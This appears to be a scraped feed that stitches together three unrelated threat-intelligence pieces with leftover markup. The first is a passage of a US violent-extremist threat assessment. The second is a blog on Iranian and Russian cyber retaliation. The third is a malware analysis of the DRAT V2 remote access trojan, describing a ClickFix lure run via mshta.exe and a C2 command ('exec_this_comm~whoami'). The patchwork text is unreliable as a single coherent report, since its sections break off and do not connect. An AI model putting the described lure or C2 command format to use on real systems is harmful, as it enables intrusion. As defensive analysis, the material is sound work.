        <p>The most persistent and lethal violent extremist threat to the US during the next twelve months will very likely come from IS supporters in the US who plan physical threat activities alone or in small groups, rely on minimal external direction from IS, and use less-sophisticated TTPs such as attacks with firearms, bladed weapons, and vehicular assaults. On New Year’s Day 2025, for example, Shamsud Din Jabbar <a href="https://www.fbi.gov/contact-us/field-offices/neworleans/news/fbi-releases-investigative-update-in-bourbon-street-attack">carried out</a> the first lethal attack in the US connected to IS since 2017, <a href="https://www.ic3.gov/PSA/2025/PSA250113">piloting</a> a pickup truck into a crowd in New Orleans, killing fourteen and wounding over 50. The attack followed a notable uptick in IS activity in the US; according to data from the George Washington University Program on Extremism, the US Department of Justice (DOJ) <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2025-01/Jihadism%20Trends%20in%202024%20%281%29.pdf">arrested</a> nine IS sympathizers on federal charges in 2024, in comparison to six the year prior. These cases allegedly included major efforts by IS sympathizers to conduct mass-casualty attacks in the US, including an Oklahoma resident <a href="https://www.justice.gov/archives/opa/pr/afghan-national-arrested-plotting-election-day-terrorist-attack-name-isis">arrested</a> in October 2024 for planning to attack an election facility on Election Day and a Canada resident <a href="https://www.justice.gov/usao-sdny/pr/pakistani-national-charged-plotting-terrorist-attack-new-york-city-support-isis">arrested</a> in September 2024 for planning to enter the US and carry out a mass shooting at a Jewish community center in New York City.</p>
        <p>Insikt Group’s June 2024 <a href="https://go.recordedfuture.com/hubfs/reports/ta-2024-0611.pdf">assessment</a> that the IS Khorasan Province (ISKP) would become IS’s global “standard-bearer for external operations and media production” was largely accurate. ISKP attack planners, functioning alongside IS logistic networks in Central Asia and Türkiye and Russian-, Uzbek-, and Tajik-speaking supporters in Europe, <a href="https://www.washingtoninstitute.org/policy-analysis/islamic-states-external-operations-are-more-just-iskp">carried out</a> several major terrorist attacks in 2024. Notably, these included the January 2024 suicide bombings in Kerman, Iran, that killed over 90, as well as the March 2024 mass shooting at the Crocus City Hall in Moscow, Russia, that resulted in hundreds of casualties, including 145 dead. Attack plots connected to the ISKP were also disrupted by security services in the US, France, Germany, Austria, Belgium, and other countries, including a thwarted effort by ISKP supporters residing in Austria to <a href="https://ctc.westpoint.edu/the-august-2024-taylor-swift-vienna-concert-plot/">attack</a> a Taylor Swift concert in Vienna in August 2024. These efforts followed a lengthy and almost certainly ongoing <a href="https://jamestown.org/program/islamic-state-increasingly-targeted-and-threatened-western-sporting-events-in-advance-of-the-paris-olympics/">campaign</a> spearheaded by the al-Azaim Foundation for Media Production — ISKP’s media arm — to <a href="https://gnet-research.org/2024/06/27/iskps-latest-campaign-expanded-propaganda-and-external-operations/">encourage</a> supporters around the world to conduct attacks targeting sports stadiums, large concert halls, and major public events in the US and Europe.</p>

          </div>
        </div>
        <p>While US-based IS supporters have represented a persistent threat despite ebbs and flows in the organization’s health overseas, ongoing geopolitical developments that are very likely <a href="https://foreignpolicy.com/2025/06/05/syrias-islamic-state-is-surging/">favorable</a> to IS will likely enhance its ability to inspire and direct plots in the US. The fall of the Assad regime in Syria, ongoing Turkish military operations in the north of the country, and a decrease in foreign assistance (through funds and military support) to the Kurdish-led Syrian Democratic Forces (SDF) will very likely create <a href="https://www.understandingwar.org/backgrounder/us-withdrawal-syria-will-reinvigorate-isis-terror-threat">opportunities</a> for IS in Iraq and al-Sham (ISIS) to exploit security vacuums and threaten areas in east and northeast Syria. The threat of an ISIS resurgence in 2025 would almost certainly be <a href="https://www.washingtoninstitute.org/policy-analysis/islamic-state-attacks-new-syrian-government">exacerbated</a> by major terrorist attacks against the new Syrian government, or alternatively by a “prison break” operation to <a href="https://www.politico.com/news/2024/12/17/us-syria-isis-jails-00194955">free</a> captive ISIS fighters and supporters in the SDF-managed al-Hawl and al-Roj prison camps. In the immediate term, an ISIS resurgence would almost certainly provide a propaganda boost for the group’s international supporters. In the medium term, it could create opportunities for ISIS to relaunch its external operations capabilities and target the US.</p>
        <h3>Al-Qaeda</h3>
        <p>Al-Qaeda very likely has a limited degree of support among American jihadist Salafi HVEs and is very unlikely to gain much more support due to the ongoing influence of its competitor, IS. In 2024, the US Intelligence Community assessed that al-Qaeda’s central command had <a href="https://www.dni.gov/files/ODNI/documents/assessments/ATA-2024-Unclassified-Report.pdf">reached</a> its “operational nadir.” While some of the group’s franchises enjoyed substantial success during the past twelve months, the strongest al-Qaeda franchises will likely remain <a href="https://www.csis.org/analysis/jihadist-terrorism-united-states#:~:text=Aside%20from%20the%209%2F11,in%20which%20a%20Royal%20Saudi">focused</a> on their areas of operation and are unlikely to devote significant resources to attacking the West in the short term. Nevertheless, the activities of specific al-Qaeda affiliates in 2024 and early 2025 portend an expanded threat to the US:</p>
        <ul>
          <li>In early 2025, Al-Shabaab <a href="https://www.france24.com/en/live-news/20250327-fears-mount-over-resurgence-of-al-shabaab-jihadists-in-somalia">launched</a> a military operation in the Shabelle and Hiiraan regions of Somalia to recapture areas it held prior to a 2022 counterterrorism operation by the Somali Armed Forces. This ongoing operation will very likely <a href="https://warontherocks.com/2025/06/flailing-state-the-resurgence-of-al-shabaab-in-somalia/">position</a> al-Shabaab to threaten the capital city, Mogadishu, as well as the Somalian government’s control over large swaths of the country. A revanchist al-Shabaab with significant territorial control in Somalia would almost certainly <a href="https://www.foreign.senate.gov/imo/media/doc/031418_Bacon_Testimony.pdf">threaten</a> US interests in the Horn of Africa and the Middle East; the group also likely has the means and intent to <a href="https://www.atlanticcouncil.org/blogs/new-atlanticist/the-us-must-sustain-counterterrorism-operations-in-somalia-the-costs-of-retreat-are-too-high/">threaten</a> the US homeland by externally guiding attack plots.</li>
          <li>In late 2023, Al-Qaeda in the Arabian Peninsula (AQAP) <a href="https://www.njohsp.gov/Home/Components/News/News/1388/2">restarted</a> its English-language Inspire series, which provides directions and information for English speakers on conducting terrorist attacks in the West. A February 2024 video specifically <a href="https://monitoring.bbc.co.uk/product/c204zmoi">called</a> for HVEs in the US to conduct local attacks because of the US’s support for Israel in its conflict against Hamas. In June 2025, a video message from AQAP leader Sa’ad bin Atef al-Awlaki <a href="https://www.timesofisrael.com/al-qaedas-yemen-chief-threatens-trump-musk-over-gaza-war-there-are-no-red-lines/">encouraged</a> HVEs to assassinate US political leaders, including President Trump and Vice President JD Vance.</li>
          <li>On May 29, 2025, US Africa Command (AFRICOM) Commander General Michael Langley <a href="https://abcnews.go.com/Politics/africa-terror-group-ramping-ability-strike-inside-us/story?id=122316983">warned</a> that Jama’at Nusrat al-Islam w’al-Muslimin (JNIM), an al-Qaeda franchise in the Sahel that has gained a substantial territorial footprint in the region, “could have the capacity to attack the homeland.” However, Insikt Group has not identified intelligence suggesting JNIM has displayed an interest in extraterritorial attack capabilities.</li>
        </ul>
        <p>US-based IS and al-Qaeda supporters will almost certainly continue to use low-budget, low-sophistication, but lethal, <a href="https://www.foreignaffairs.com/articles/united-states/2017-06-13/dont-follow-money">methods</a> of attack such as firearms, bladed weapons, and vehicular assaults, as well as retain their focus on targeting US government and law enforcement agencies, major public events, large commercial facilities, and targets associated with Jewish or Christian communities in the US. However, due to their increasing affordability, commercial availability, and ease of use, jihadist Salafi attack planners are also very likely to experiment with UAV and UAV-borne IEDs as attack TTPs. During 2024, jihadist Salafi propaganda frequently promoted the use of drones in conducting attacks, with some unofficial outlets providing guidance to supporters on how to operate them. A successful UAV-borne IED attack plot, whether in the US or overseas, would almost certainly <a href="https://ctc.westpoint.edu/the-rising-threat-of-non-state-actor-commercial-drone-use-emerging-capabilities-and-threats/">demonstrate</a> a proof of concept and supercharge jihadist Salafi HVEs’ interest in UAVs.</p>
        <h3>Hamas</h3>
        <p>Mass-casualty terrorist attacks in the US with a nexus to Hamas or other Palestinian Territories-based FTOs (including Palestinian Islamic Jihad [PIJ], the Popular Front for the Liberation of Palestine [PFLP], and others) remain very unlikely in the short term. These organizations have not demonstrated a capability or interest in conducting large-scale attacks in the US, although their ongoing conflict against Israel has almost certainly <a href="https://www.justice.gov/opa/media/1402301/dl">inspired</a> US violent extremists without tangible ties to the organizations to conduct violence. Since Hamas’s October 7, 2023, al-Aqsa Flood terrorist attack in Israel, the Israel Defense Forces (IDF) have almost certainly <a href="https://www.bbc.com/news/world-middle-east-67103298">decimated</a> Hamas’s leadership, particularly within the Izz ad-Din al-Qassam Brigades, the organization’s military wing. Because of the element of inspiration, large-scale attack plots perpetrated by Hamas supporters in the US cannot be ruled out, although most violence with a direct link to the group is very likely to be small-scale and sporadic, and only occur at protests or demonstrations where Hamas supporters confront counter-demonstrators or law enforcement.</p>
        <p>While post-October 7 developments and Hamas’s conflict with Israel continue to almost certainly <a href="https://www.dhs.gov/sites/default/files/2024-10/24_0930_ia_24-320-ia-publication-2025-hta-final-30sep24-508.pdf">motivate</a> sympathies for Hamas among American violent extremists, the primary means of interaction between US Hamas supporters and the organization’s command and control structure almost certainly continues to be through financing efforts. The group has almost certainly <a href="https://www.congress.gov/crs-product/IF12537">created</a> a complex network of cryptocurrency donation portals, exchanges, and wallets, from which they have <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">generated</a> “tens of millions” of US dollars from foreign donors, including from the US. These networks have likely replaced the role of “brick-and-mortar” US-based charitable organizations that, for decades, have allegedly <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2023-10/hamas-networks-final.pdf">provided</a> funds from US donors to Hamas, PIJ, PFLP, and other Palestinian FTOs.</p>
        <h3>Axis of Resistance</h3>
        <p>The US missile strikes targeting Iranian nuclear facilities on June 21 and 22, 2025, likely increased the risk of HVE and DVE supporters of Iran and its Axis of Resistance groups, such as Hezbollah, the Houthis, Iraqi Shi’a militias, and others, conducting physical threat activities on US soil, although these groups are still unlikely to carry out a mass-casualty terrorist attack in the US during the next twelve months. While Iran’s military and intelligence agencies are likely to enhance their efforts to <a href="https://www.washingtoninstitute.org/policy-analysis/contending-irgc-plots">recruit</a> assets in the US to carry out targeted attacks against US political figures and dissidents in the aftermath of the strikes, these efforts will very likely be constrained by US law enforcement investigations, the relative structural weakness of Axis of Resistance groups, and the almost certain disinterest of many US-based HVE and DVE groups in supporting Iran. Several factors during the next twelve months, including public incitement of attacks on US soil by Iranian officials or future US military activity against Iran, could <a href="https://www.dhs.gov/ntas/advisory/national-terrorism-advisory-system-bulletin-june-22-2025">augment</a> these threats, although the most likely scenario is US HVEs and DVEs attempting to provide financial and material support to these groups on their own.</p>
        <p>Iran’s proxies have not publicly indicated their interest in recruiting or directing Americans to conduct attacks on their behalf in the US since October 7, 2023. However, Iran’s military and intelligence agencies, particularly the Islamic Revolutionary Guard Corps (IRGC), have almost certainly continued their efforts to <a href="https://www.justice.gov/archives/opa/pr/member-irans-islamic-revolutionary-guard-corps-irgc-charged-plot-murder-former-national">recruit</a> and <a href="https://www.yahoo.com/news/iranian-regime-media-praises-alleged-165750170.html?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAL1ieWEJq2Ibjsklz0LAFd39o3v0kCr5yAvdW5o1TN9OyMaozdUtdoP7A_QUd1o_CXEo6iX1HayOCb12jq0679ZhQzyP-1lpiQ22yWrPl-XB-fdPpkRVks46EIhAfPn9JXp6ya7c4rHr-zW2m9sq_0EgsZXmdxzbN_9i56MAFI-o">incite</a> overseas threat actors to <a href="https://www.justice.gov/usao-sdny/pr/us-attorney-announces-murder-hire-and-related-charges-against-irgc-asset-and-two-local">conduct</a> targeted attacks and assassinations against high-profile US politicians and Iranian dissidents on US soil. Iran’s motivation to revitalize these efforts, several of which have been <a href="https://edition.cnn.com/2022/08/10/politics/justice-department-charges-iranian-with-trying-to-assassinate-john-bolton">identified</a> and <a href="https://www.pbs.org/newshour/world/pakistani-man-with-ties-to-iran-is-charged-in-u-s-political-assassination-plot">disrupted</a> by US law enforcement, likely increased in the immediate aftermath of US directly attacking Iran, although the subsequent ceasefire and cessation of US military activity in Iran will very likely decrease Iran’s appetite for remotely guiding terror plots in the medium-to-long term, if the ceasefire holds. There is no evidence to suggest that the IRGC exclusively recruits ideologically motivated violent extremists for these efforts (many of their <a href="https://www.bbc.com/news/articles/c308p0rjq9zo">assets</a> have been <a href="https://www.justice.gov/archives/opa/pr/justice-department-announces-murder-hire-and-related-charges-against-irgc-asset-and-two">participants</a> in criminal organizations who are financially solicited to conduct attacks), and Iran will very likely attempt to <a href="https://www.cbsnews.com/amp/news/trump-administration-monitor-iran-backed-cells-trump-weighs-strikes/">exploit</a> threat actors in the US with common ideological causes to conduct attacks on their behalf.</p>
        <p>Hezbollah’s ability to conduct extraterritorial attacks outside of Lebanon was almost certainly diminished by the leadership losses the organization <a href="https://www.washingtoninstitute.org/policy-analysis/after-hezbollahs-miscalculations-it-has-lost-much-its-power">suffered</a> during Israeli strikes in 2024, particularly its secretaries general Hassan Nasrallah and Hashem Safieddine and military leaders Fuad Shukr and Ibrahim Aqil. Notably, Aqil was a senior <a href="https://www.washingtoninstitute.org/policy-analysis/death-another-hezbollah-lifer">member</a> of Hezbollah’s Islamic Jihad Organization, which has historically been <a href="https://www.odni.gov/nctc/terrorist_groups/lebanese_hizballah.html">responsible</a> for planning external operations, including in the US. Ongoing Lebanese government efforts to demilitarize Hezbollah will likely further reduce the group’s capabilities and interest in attacking the West. In 2024, there were sporadic instances of US HVEs attempting to <a href="https://www.justice.gov/usao-wdpa/pr/upper-st-clair-man-who-traveled-lebanon-and-syria-goal-joining-hizballah-indicted">provide</a> material support for Hezbollah by joining the organization, although in these cases Hezbollah almost certainly indicated they were uninterested in taking on US or Western foreign fighters.</p>
        <p>Likewise, the Houthis have not demonstrated the intent, capability, or interest in conducting terrorist attacks in the US, preferring to <a href="https://www.crisisgroup.org/visual-explainers/red-sea/">target</a> commercial vessels in the Red Sea and, on occasion, Israel. On March 5, 2025, the US Department of State <a href="https://www.state.gov/designation-of-ansarallah-as-a-foreign-terrorist-organization/">redesignated</a> the Houthis as an FTO just before the <a href="https://news.usni.org/2025/04/29/operation-rough-rider">launch</a> of Operation Rough Rider, a US military campaign of airstrikes against the organization in Yemen. During the next twelve months, there are likely to be instances where US HVEs donate or otherwise provide material support to the Houthis. In this case, it would be unclear whether this trend would represent an increase in this activity, as the provision of material support to the Houthis was not illegal (and therefore not subject to prosecutions and investigations) in the US prior to their March 5, 2025, designation.</p>

            <description><![CDATA[Dive into the concept of the "retaliation window"—how timing influences threat intelligence, risk management, and strategic decision-making in today's cyber and business landscape.]]></description>
            <content:encoded><![CDATA[
        <p><em>ChatGPT: National Cyber Retaliation Possibilities</em></p>
        <p>What happens when a strike silences centrifuges but accelerates keyboards? History tells us this story. When kinetic operations eliminate nuclear capabilities, adversaries pivot to asymmetric digital warfare. US and Israeli companies now sit squarely in the cyber crosshairs.</p>
        <h2>Escalation with Code Instead of Missiles</h2>
        <p>The US kinetic strike on Iran's Fordow enrichment plant creates questions about retaliation doctrine. Historical precedent reveals Iran's preference for <a href="https://ctc.westpoint.edu/cyber-threat-iran-death-soleimani/">cyber responses</a> to physical provocations. 2012’s <a href="https://www.ebsco.com/research-starters/political-science/operation-ababil-2012">Operation Ababil</a> and <a href="https://www.controleng.com/throwback-attack-hackers-take-advantage-of-the-holidays-to-hit-oil-giant-saudi-aramco/">Shamoon wiper attack</a>, and 2014’s <a href="https://www.bloomberg.com/news/articles/2014-12-11/iranian-hackers-hit-sheldon-adelsons-sands-casino-in-las-vegas?sref=D1QuWRIe">attack on Sands</a>, demonstrated this pattern. Russia's possible concurrent involvement in such campaigns amplifies both reach and destruction potential.</p>
        <p>Intelligence professionals recognize that adversary keyboards often respond faster than missile batteries. For executives, the core question isn't "Will there be cyber retaliation?" but rather "Where, when, and how severe?"</p>
        <h2>Understanding Adversary Archetypes</h2>
        <p>Recorded Future's threat intelligence reveals distinct operational signatures across Iranian and Russian threat actors:</p>
        <ul>
          <li><strong>Iranian APT groups (APT34, APT39, APT35)</strong> demonstrate sophisticated credential harvesting campaigns targeting government contractors and energy infrastructure. Their methodology emphasizes long dwell-time persistence and intelligence collection over immediate destruction.</li>

          </div>
        </div>
        <ul>
          <li><strong>Russian-aligned actors (APT44, KillNet, BlueDelta)</strong> favor destructive operations, including wipers, DDoS campaigns, and infrastructure targeting. These groups excel at civil disruption and psychological operations.</li>
          <li><strong>Fusion campaigns</strong> represent the emerging threat model where diversionary attacks mask primary objectives. DDoS serves as operational noise while parallel intrusions establish persistent access for data exfiltration or lateral movement.</li>
        </ul>
        <p><a href="https://www.bloomberg.com/news/articles/2025-06-20/iran-hijacking-home-security-cameras-to-spy-within-israel?sref=D1QuWRIe">Recent events</a> indicate Iranian TTPs mimicking previous Russian cyber unit successes in Ukraine, though <a href="https://t.me/estoniaworldwide/280143">Telegram claims</a> of active collaboration and targeting shared adversaries are currently unsubstantiated.</p>
        <h2>Sector Prioritization Analysis</h2>
        <p>Based on volume and velocity analytics from Recorded Future's platform, the following sectors present the highest-probability targets for retaliatory operations:</p>
        <p><strong>Energy and Utilities</strong> remain symbolically and strategically valuable. Iranian threat actors demonstrated a sophisticated understanding of industrial control systems in previous Aramco operations. Expect renewed focus on grid infrastructure and petroleum refinement.</p>
        <p><strong>Defense and Aerospace</strong> contractors face elevated spearphishing and supply chain compromise attempts. Organizations with known DoD contracts should anticipate credential stuffing, social engineering, and APT pivot campaigns targeting intellectual property.</p>
        <p><strong>Financial Services</strong> attract Russian DDoS expertise and payment ecosystem disruption. Major banks, cryptocurrency platforms, and payment processors face coordinated attacks designed to undermine confidence in financial stability.</p>
        <p><strong>Healthcare and Water Infrastructure</strong> provide "soft power" leverage without triggering a full military response. <a href="https://therecord.media/us-offers-reward-for-info-on-iranian-hackers-water-utilities">Recent intrusions into US water treatment facilities</a> illustrate this tactical approach.</p>
        <p>The <a href="https://intelligence2risk.substack.com/p/charting-new-terrain-the-shift-to">proximity-and-resilience graph</a> suggests these sectors will experience accelerated attack velocity as geopolitical tensions escalate.</p>
        <h2>Strategic Readiness Beyond SOC Operations</h2>
        <p>Operational controls represent a baseline defense. Resilient organizations distinguish themselves through executive-level preparation and strategic threat anticipation.</p>
        <h3>Intelligence-Driven Risk Communication</h3>
        <p>Implement the <a href="https://intelligence2risk.substack.com/p/intelligence-to-risk">Intelligence to Risk (I2R) Pyramid framework</a> to translate event signals into board-level recommendations. Intelligence without downstream decision impact merely creates noise. Effective CTI programs identify threat implications, validate control effectiveness, and produce actionable recommendations with clear upside/downside risk articulation.</p>
        <h3>Scenario Development Using Structured Frameworks</h3>
        <p>Deploy PESTLE (Political, Economic, Sociological, Technological, Legal, Environmental) analysis and <a href="https://intelligence2risk.substack.com/p/the-resilience-dilemma">Cone of Plausibility modeling</a> to evaluate second- and third-order impacts. Assume hybrid threat scenarios where cyber attacks coordinate with disinformation campaigns, fraud operations, or supply-chain corruption.</p>
        <h3>Resilience Measurement and Validation</h3>
        <p>Move beyond compliance theater toward continuous control validation. Organizations with genuine <a href="https://intelligence2risk.substack.com/p/rate-my-rizz">resilience ("rizz")</a> regularly test defenses using real-world TTPs rather than audit checklists. Control validation platforms enable automated purple teaming and breach simulation using current adversary methodologies.</p>
        <h3>Crisis Scenario Exercises</h3>
        <p>Conduct tabletop exercises simulating destructive ransomware, DNS hijacking, or public data exposure campaigns tied to adversarial propaganda. Include communications, legal, finance, and supply chain leadership in scenario planning.</p>
        <h3>External Dependency Risk Assessment</h3>
        <p>Inventory and validate upstream service providers, including CDN, DNS, and hosting infrastructure. If Iranian botnets target DNS registrars or Russian DDoS campaigns affect ISP connectivity, backup options become critical.</p>
        <h3>AI-Enabled Defense to Mirror Adversary Velocity</h3>
        <p>Modern threat actors leverage AI for campaign acceleration and evasion techniques. Defensive AI adoption becomes essential for matching adversary tempo and scale.</p>
        <ul>
          <li>Automate initial incident triage using AI classification systems. When Iranian APT groups launch credential harvesting campaigns targeting hundreds of employees simultaneously, AI-driven email analysis can identify and quarantine malicious messages faster than manual review processes.</li>
          <li>Implement AI-enhanced deception technologies that adapt honeypot configurations based on observed attacker TTPs. Dynamic deception networks can automatically adjust to mirror production environments while capturing threat actor tooling and methodologies.</li>
          <li>Use generative AI for threat intelligence synthesis and executive reporting. Large language models can process multiple threat feeds, correlate indicators across campaigns, and generate actionable summaries for board-level consumption within minutes rather than hours.</li>
          <li>Consider AI-assisted red team exercises that continuously probe defenses using current adversary techniques. Automated purple teaming platforms can simulate Iranian spearphishing or Russian wiper campaigns at scale, identifying control gaps before real attacks exploit them.</li>
        </ul>
        <p>Even with the best of AI, human expertise remains critical for strategic decision-making, false positive management, and complex threat attribution. The optimal approach combines AI speed with human judgment.</p>
        <h2>From Crisis Optics to Resilient Strategy</h2>
        <p>Kinetic escalation has opened pathways for asymmetric digital retribution. However, resilient enterprises leverage threat intelligence for decision-making before breaches occur. This requires abandoning audit theater, embracing proactive control validation, and communicating risk in executive-comprehensible language.</p>
        <p>The current geopolitical environment demands evolved approaches to cyber resilience. Organizations that recognize this shift and adapt accordingly will maintain operational continuity while competitors struggle with reactive crisis management.</p>
        <p>In this new phase of geopolitical conflict, it's not just data that is at stake—it's institutional confidence and competitive advantage.</p>

            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>During an investigation into a <a href="https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence">recent</a> TAG-140 campaign targeting Indian government organizations, Insikt Group identified a modified variant of the DRAT remote access trojan (RAT), which we designated as DRAT V2. TAG-140 has overlaps with SideCopy, an operational subgroup assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC LEOPARD). TAG-140 has consistently demonstrated iterative advancement and variety in its malware arsenal and delivery techniques. This latest campaign, which spoofed the Indian Ministry of Defence via a cloned press release portal, marks a slight but notable shift in both malware architecture and command-and-control (C2) functionality.</p>
        <p>The deployment of DRAT V2 reflects TAG-140’s ongoing refinement of its remote access tooling, transitioning from a .NET-based version of DRAT to a new Delphi-compiled variant. Both versions are among numerous RATs the group has leveraged, such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, and ReverseRAT, indicating a pattern of rotating malware use. DRAT V2 updates its custom TCP-based, server-initiated C2 protocol and expands functional capabilities, including arbitrary shell command execution and enhanced file system interaction.</p>
        <p>Analysis of the infection chain indicates that initial access was achieved through a ClickFix-style social engineering lure. Victims were enticed to execute a malicious script via mshta.exe, which led to the execution of the BroaderAspect .NET loader, which has <a href="https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india">previously</a> been used by TAG-140. BroaderAspect establishes persistence and subsequent DRAT V2 installation and execution.</p>
        <p>Insikt Group attributes this activity to TAG-140 with moderate confidence based on domain overlap, malware lineage, and infrastructure characteristics. DRAT V2’s enhancements suggest a likely increase in TAG-140’s capacity for tailored post-exploitation and lateral movement across victim networks. As such, its emergence is a relevant indicator of the threat actor’s maturing tradecraft and strategic targeting of India’s defense and governmental institutions.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>DRAT V2 adds a new command (exec_this_comm) for arbitrary shell command execution, enhancing post-exploitation flexibility.</li>
          <li>The malware obfuscates its C2 IP addresses using Base64 encoding with prepended strings to hinder straightforward decoding.</li>
          <li>Compared to its predecessor, DRAT V2 reduces string obfuscation by keeping most command headers in plaintext, likely prioritizing parsing reliability over stealth.</li>
          <li>DRAT V2 updates its custom server-initiated TCP protocol to support commands input in both ASCII and Unicode, while responding in ASCII only.</li>
          <li>DRAT V2 lacks advanced anti-analysis techniques and relies on basic infection and persistence methods, making it detectable via static and behavioral analysis.</li>
        </ul>
        <h2>Background</h2>
        <p>TAG-140 is a threat actor group that overlaps with the publicly reported group Sidecopy, a <a href="https://thehackernews.com/2021/07/sidecopy-hackers-target-indian.html">suspected</a> Pakistani state-aligned advanced persistent threat (APT) group assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC Leopard). Active since at least 2019, TAG-140 primarily <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks">targets</a> Indian entities, with recent activity expanding beyond traditional government, defense, maritime, and academic sectors to now include organizations affiliated with the country’s railway, oil and gas, and external affairs ministries.</p>
        <p>The group has demonstrated (<a href="https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india">1</a>, <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks">2</a>, <a href="https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat">3</a>) a consistent evolution in its tradecraft: leveraging spearphishing campaigns, using HTML applications (HTAs) or Microsoft Installer (MSI) packages for distribution, exploiting software vulnerabilities (for example, WinRAR), and using many different RATs such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, ReverseRAT, and DRAT. Their infection chains commonly target both Windows and Linux environments.</p>
        <p>Insikt Group analyzed <a href="https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence">artifacts</a> from a recent ClickFix campaign spoofing the Indian Ministry, which we have attributed to TAG-140 threat actors. TAG-140 created a counterfeit website mimicking the Indian Ministry of Defence's official press release portal using the malicious domain <em>email[.]gov[.]in[.]drdosurvey[.]info</em>, which closely resembles the legitimate government website <em>mod[.]gov[.]in</em> (<a href="https://urlscan.io/result/72a275de-19dd-4f96-9594-43a676b86ff5/">urlscan.io</a>). The cloned website replicated the structure and layout of the authentic portal, listing press releases from September 2023 to April 2025. However, only the link for March 2025 was active.</p>

        <p>Clicking the active March 2025 link triggered a ClickFix-style social engineering attack. Insikt Group conducted additional analysis of the TAG-140 Windows infection chain and determined it to be similar to an infection chain <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks/">reported</a> by Seqrite Labs in their research on TAG-140 activity, which was identified in late 2024. Our analysis of the infection chain (<strong>Figure 2</strong>) reveals that the final payload is a new Delphi-based variant of DRAT (referred to as DRAT V2). Previously, DRAT was developed in .NET and was first <a href="https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/">attributed</a> to SideCopy activity in 2023. The updated variant includes new command functionality and a slightly modified C2 protocol.</p>

        <h2>Technical Analysis</h2>
        <p>DRAT V2 is a lightweight RAT developed in Delphi and represents an evolution of the earlier .NET-based variant first attributed to TAG-140 in 2023. DRAT V2 introduces several updates from its predecessor, including:</p>
        <ul>
          <li>An update to its custom TCP server-initiated C2 protocol</li>
          <li>Enhanced Base64 obfuscation of C2 infrastructure with added prepended strings</li>
          <li>Updated command headers and a new command for the execution of arbitrary Windows commands</li>
        </ul>
        <p>A high-level overview of DRAT V2 is provided in <strong>Figure 3</strong>.</p>

          </div>
        </div>
        <p>DRAT V2 supports a set of commands that allow TAG-140 operators to perform a wide range of interactions with compromised hosts. Upon establishing communication, the malware passively awaits instructions from the C2 server. Supported operations include system reconnaissance, such as collecting the username, operating system version, system time, and current working directory, as well as connectivity validation and enumeration of local file systems and directories.</p>
        <p>Beyond reconnaissance, DRAT V2 facilitates more active engagement with the target environment. It enables file transfers in both directions between the host and the C2 infrastructure, allowing operators to upload additional payloads or exfiltrate data. Additionally, it supports the execution of local files and arbitrary Windows shell commands, returning the output to the C2. These functions provide TAG-140 with persistent, flexible control over the infected system and allow for both automated and interactive post-exploitation activity without requiring the deployment of auxiliary malware tools. <strong>Figure 4</strong> provides a summary of DRAT V2’s capabilities.</p>

        <h2>DRAT V2 Commands</h2>
        <p>DRAT V2 continues its use of a command interface that is a custom TCP, text-based, server-initiated protocol to support remote control capabilities across a compromised host. Command execution, file manipulation, and system reconnaissance are enabled through a structured format.</p>
        <p>The DRAT V2 command protocol is distinguished by the use of tilde (~) and pipe (|) characters as delimiters. Upon establishing connectivity with its C2 infrastructure, the malware enters a passive state, awaiting inbound instructions from the server. These instructions span nine discrete command types (<strong>Table 1</strong>), encompassing capabilities such as host reconnaissance, file management, and direct execution. Each command follows a deterministic format, allowing the operator to orchestrate post-compromise actions with consistency and low overhead.</p>

        <p><strong><em>Table 1:</em></strong> <em>DRAT V2 commands (Source: Recorded Future)</em></p>
        <p>This command set enables TAG-140 to support a range of post-exploitation objectives, including host reconnaissance, data staging, and potential lateral movement. Notably, DRAT V2 extends the functionality of its predecessor by incorporating support for arbitrary command execution. <strong>Appendix B</strong> provides detailed breakdowns of each command, including parameters.</p>
        <p><strong>Figure 5</strong> shows an example of the C2 communication between an infected host and the C2. In this example, the C2 server sends the command exec_this_comm~whoami, which tells the infected host to execute the command whoami. The infected host then responds with the output of the command.</p>

        <h2>DRAT vs DRAT V2</h2>
        <p>This comparative analysis highlights the technical and operational differences between the original DRAT and DRAT V2. The shift in development platforms marks a significant architectural transition that affects how the malware is compiled, executed, and potentially detected. Although both variants maintain similar core functionalities as lightweight RATs, DRAT V2 introduces meaningful enhancements in its command structure, C2 obfuscation techniques, and communication protocol while also minimizing its use of string obfuscation. These adaptations likely reflect TAG-140’s continued efforts to evolve their tooling for improved evasion, modularity, and flexibility in post-exploitation operations.</p>
        <h3>Command Header Variation</h3>
